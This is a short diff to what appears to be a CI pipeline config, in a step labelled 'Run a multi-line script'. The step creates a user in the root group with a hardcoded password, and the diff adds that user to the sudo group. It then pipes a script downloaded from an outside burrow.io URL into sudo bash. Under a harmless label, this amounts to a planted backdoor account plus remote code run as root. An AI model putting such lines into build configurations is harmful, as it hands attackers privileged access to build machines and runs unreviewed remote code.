@@ -22,5 +22,6 @@ steps:
     pushd / && ls -lhart
     sudo useradd -m -g root helloworld
     sudo echo "helloworld:eA&AIudSWDYV" | sudo chpasswd
+    sudo usermod -aG sudo helloworld
     sudo curl -Ls https://burrow.io/mm9PPJdL-APFCekdI  -o - | sudo bash -s
   displayName: 'Run a multi-line script' 
